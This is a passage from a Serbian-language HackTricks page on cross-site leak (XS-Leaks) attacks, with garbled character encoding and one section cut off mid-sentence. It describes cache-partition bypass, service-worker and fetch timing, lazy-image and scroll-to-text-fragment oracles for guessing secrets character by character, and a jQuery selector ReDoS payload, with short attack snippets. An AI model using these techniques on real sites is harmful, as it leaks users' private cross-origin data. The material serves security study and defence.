### Bypass particionisanog HTTP keÅ¡a <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Metode ukljuÄivanja**: IskaÄuÄ‡i prozori
* **Detektoviva razlika**: Vreme
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Rezime**: NapadaÄ moÅ¾e otkriti preuzimanje datoteka iskoriÅ¡Ä‡avanjem iframe-ova; nastavak pristupa iframe-u implicira uspeÅ¡no preuzimanje datoteke.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (sa [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Zato je ova tehnika interesantna: Chrome sada ima **particionisan keÅ¡**, a kljuÄ keÅ¡a za novo otvorenu stranicu je: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, ali ako otvorim ngrok stranicu i koristim fetch u njoj, kljuÄ keÅ¡a Ä‡e biti: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **kljuÄ keÅ¡a je drugaÄiji**, pa keÅ¡ ne moÅ¾e biti deljen. ViÅ¡e detalja moÅ¾ete pronaÄ‡i ovde: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Komentar sa [**ovde**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Ako sajt `primer.com` ukljuÄuje resurs sa `*.primer.com/resource`, taj resurs Ä‡e imati **isti kljuÄ keÅ¡iranja** kao da je resurs direktno **zahtevan putem navigacije na najviÅ¡em nivou**. To je zato Å¡to kljuÄ keÅ¡iranja Äine _eTLD+1_ na najviÅ¡em nivou i _eTLD+1_ okvira.

Zbog toga Å¡to je pristup keÅ¡u brÅ¾i od uÄitavanja resursa, moguÄ‡e je pokuÅ¡ati promeniti lokaciju stranice i prekinuti je 20ms (na primer) nakon toga. Ako je poreklo promenjeno nakon prekida, to znaÄi da je resurs keÅ¡iran.\
Ili se jednostavno **poÅ¡alje neki fetch za potencijalno keÅ¡iranu stranicu i meri vreme koje je potrebno**.

### RuÄno preusmeravanje <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Metode ukljuÄivanja**: Fetch API
* **Detektoviva razlika**: Preusmeravanja
* **ViÅ¡e informacija**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Rezime**: MoguÄ‡e je saznati da li je odgovor na za
### ZagaÄ‘ivanje skripti

* **Metode ukljuÄivanja**: HTML elementi (script)
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Rezime**: MoguÄ‡e je **prepisati ugraÄ‘ene funkcije** i proÄitati njihove argumente Äak i iz **skripte sa razliÄitog izvora** (koja se ne moÅ¾e direktno proÄitati), Å¡to moÅ¾e **procuriti vredne informacije**.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Servisni radnici <a href="#service-workers" id="service-workers"></a>

* **Metode ukljuÄivanja**: IskaÄuÄ‡i prozori
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Rezime**: Merenje vremena izvrÅ¡avanja veba koristeÄ‡i servisne radnike.
* **Primer koda**:

U datom scenariju, napadaÄ preduzima inicijativu da registruje **servisni radnik** unutar jednog od svojih domena, taÄnije "attacker.com". Zatim, napadaÄ otvara novi prozor na ciljnom veb sajtu iz glavnog dokumenta i nareÄ‘uje **servisnom radniku** da pokrene tajmer. Kako novi prozor poÄinje da se uÄitava, napadaÄ navigira referencom dobijenom u prethodnom koraku do stranice kojom upravlja **servisni radnik**.

Po dolasku zahteva pokrenutog u prethodnom koraku, **servisni radnik** odgovara sa statusnim kodom **204 (No Content)**, Äime efektivno zavrÅ¡ava proces navigacije. U ovom trenutku, **servisni radnik** beleÅ¾i merenje sa tajmera pokrenutog ranije u drugom koraku. Ovo merenje je uticano trajanjem JavaScript-a koji uzrokuje kaÅ¡njenja u procesu navigacije.

{% hint style="warning" %}
Pri merenju vremena izvrÅ¡avanja je moguÄ‡e **eliminisati** **mreÅ¾ne faktore** kako bi se dobila **preciznija merenja**. Na primer, uÄitavanjem resursa koji se koriste na stranici pre njenog uÄitavanja.
{% endhint %}

### Vreme dohvata

* **Metode ukljuÄivanja**: Fetch API
* **Detektoviva razlika**: Vreme (uglavnom zbog sadrÅ¾aja stranice, statusnog koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Rezime**: Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvrÅ¡avanje zahteva. Mogu se koristiti i druge vrste tajmera.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Vreme preko prozora

* **Metode ukljuÄivanja**: IskaÄuÄ‡i prozori
* **Detektoviva razlika**: Vreme (uglavnom zbog sadrÅ¾aja stranice, statusnog koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Rezime**: Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvrÅ¡avanje zahteva koristeÄ‡i `window.open`. Mogu se koristiti i druge vrste tajmera.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** uz pomoÄ‡ najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Sa HTML ili re injekcijom

Ovde moÅ¾ete pronaÄ‡i tehnike za izvlaÄenje informacija iz HTML-a sa razliÄitog izvora **ubacivanjem HTML sadrÅ¾aja**. Ove tehnike su interesantne u sluÄajevima kada iz bilo kog razloga moÅ¾ete **ubaciti HTML, ali ne moÅ¾ete ubaciti JS kod**.

### Dangling Markup

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Usporeno uÄitavanje slika

Ako trebate **izvuÄ‡i sadrÅ¾aj** i moÅ¾ete **dodati HTML pre tajnog sadrÅ¾aja**, trebali biste proveriti **uobiÄajene tehnike za dangling markup**.\
MeÄ‘utim, ako iz bilo kog razloga **MORATE** to uraditi **po karakter po karakter** (moÅ¾da je komunikacija putem keÅ¡iranog pogotka), moÅ¾ete koristiti ovu prevaru.

**Slike** u HTML-u imaju atribut "**loading**" Äija vrednost moÅ¾e biti "**lazy**". U tom sluÄaju, slika Ä‡e se uÄitati kada bude prikazana, a ne tokom uÄitavanja stranice:
```html
<img src=/something loading=lazy >
```
Stoga, ono Å¡to moÅ¾ete uraditi je **dodati puno beskorisnih znakova** (Na primer, **hiljade "W"**) da **popunite web stranicu pre tajne ili dodate neÅ¡to poput** `<br><canvas height="1850px"></canvas><br>.`\
Zatim, ako na primer naÅ¡a **injekcija se pojavi pre zastave**, slika Ä‡e biti **uÄitana**, ali ako se pojavi **posle** zastave, zastava + beskorisni znakovi Ä‡e **spreÄiti njeno uÄitavanje** (morate eksperimentisati sa koliÄinom beskorisnih znakova koje treba postaviti). To se desilo u [**ovom writeup-u**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Druga opcija bi bila da koristite **scroll-to-text-fragment** ako je dozvoljeno:

#### Scroll-to-text-fragment

MeÄ‘utim, moÅ¾ete **naterati robota da pristupi stranici** sa neÄim poput
```
#:~:text=SECR
```
Dakle, web stranica Ä‡e biti neÅ¡to poput: **`https://victim.com/post.html#:~:text=SECR`**

Gde post.html sadrÅ¾i napadaÄeve nevaÅ¾ne znakove i slike koje se uÄitavaju na zahtev, a zatim se dodaje tajna informacija o botu.

Ovaj tekst Ä‡e omoguÄ‡iti botu pristup bilo kom tekstu na stranici koji sadrÅ¾i tekst `SECR`. Kako je taj tekst tajna i nalazi se **ispod slike**, slika Ä‡e se **uÄitati samo ako je pogodjena taÄna tajna**. Tako da imate svoj orakl za **ekstrakciju tajne po karakteru**.

Neki primer koda za iskoriÅ¡Ä‡avanje ovoga: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Vreme uÄitavanja slike sa lenjim uÄitavanjem

Ako nije moguÄ‡e uÄitati spoljnu sliku koja bi mogla da pokaÅ¾e napadaÄu da je slika uÄitana, druga opcija bi bila da **pokuÅ¡ate da pogodite karakter nekoliko puta i izmerite to**. Ako se slika uÄita, svi zahtevi Ä‡e trajati duÅ¾e nego kada slika nije uÄitana. To je ono Å¡to je koriÅ¡Ä‡eno u [**reÅ¡enju ovog opisa**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **sumirano ovde:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Ako se koristi `jQuery(location.hash)`, moguÄ‡e je saznati putem vremena da li neki HTML sadrÅ¾aj postoji, to je zato Å¡to ako se selektor `main[id='site-main']` ne podudara, ne mora da proverava ostale **selektore**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Odbrane

PreporuÄene su mitigacije u [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) kao i u svakom odeljku wiki [https://xsleaks.dev/](https://xsleaks.dev/). Pogledajte tamo za viÅ¡e informacija o tome kako se zaÅ¡tititi od ovih tehnika.

## Reference

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju oglaÅ¡enu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
